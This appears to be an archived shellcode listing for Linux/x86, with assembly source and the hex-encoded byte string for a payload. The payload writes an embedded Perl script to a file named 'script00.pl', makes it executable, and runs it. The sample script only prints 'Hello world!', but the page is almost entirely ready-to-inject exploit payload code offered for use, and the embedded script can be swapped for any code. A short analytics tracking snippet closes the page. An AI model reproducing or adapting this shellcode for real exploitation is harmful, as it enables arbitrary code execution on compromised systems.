<html><head><title>Linux/x86 - Perl script execution 99 bytes + script length</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Author    : darkjoker
Site      : http://darkjoker.net23.net
Shellcode : linux/x86 Perl script execution 99 bytes + script length


        .global _start

_start:
        xor     %eax, %eax
        xor     %ebx, %ebx
        xor     %ecx, %ecx
        xor     %edx, %edx
        xor     %edi, %edi
        xor     %esi, %esi
        push    %eax
        push    $0x6c702e30
        push    $0x30307470
        push    $0x69726373

        mov     %esp, %ebx
        movb    $0x5, %al
        movb    $0x41, %cl
        int     $0x80
        jmp     one

two:

        mov     %ebx, %esi
        mov     %eax, %ebx

        pop     %edi

        push    %edi

	// Begin http://www.int80h.org/strlen/
	xor     %ecx, %ecx
        xor     %eax, %eax
        not     %ecx
        repne   scasb
        not     %ecx
        dec     %ecx
	// End   http://www.int80h.org/strlen/

        pop     %edi
        mov     %ecx, %eax
        mov     %edi, %ecx
        mov     %eax, %edx

        movb    $0x4, %al
        int     $0x80

        movb    $0x6, %al
        int     $0x80

        mov     %esi, %ebx
        movb    $0xf, %al
        movw    $0x1fc, %cx
        int     $0x80

        movb    $0xb, %al
        xor     %ecx, %ecx
        xor     %edx, %edx
        int     $0x80

        movb    $0x1, %al
        xor     %ebx, %ebx
        int     $0x80

one:
        call    two
        .string &quot;#!/usr/bin/perl\nprint (\&quot;Hello world!\\n\&quot;);\n&quot;
*/
char main [] = 
&quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2&quot;
&quot;\x31\xff\x31\xf6\x50\x68\x30\x2e&quot;
&quot;\x70\x6c\x68\x70\x74\x30\x30\x68&quot;
&quot;\x73\x63\x72\x69\x89\xe3\xb0\x05&quot;
&quot;\xb1\x41\xcd\x80\xeb\x38\x89\xde&quot;
&quot;\x89\xc3\x5f\x57\x31\xc9\x31\xc0&quot;
&quot;\xf7\xd1\xf2\xae\xf7\xd1\x49\x5f&quot;
&quot;\x89\xc8\x89\xf9\x89\xc2\xb0\x04&quot;
&quot;\xcd\x80\xb0\x06\xcd\x80\x89\xf3&quot;
&quot;\xb0\x0f\x66\xb9\xfc\x01\xcd\x80&quot;
&quot;\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&quot;
&quot;\xb0\x01\x31\xdb\xcd\x80\xe8\xc3&quot;
&quot;\xff\xff\xff&quot;
&quot;#!/usr/bin/perl\nprint (\&quot;Hello world!\\n\&quot;);\n&quot;; // Here script source


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
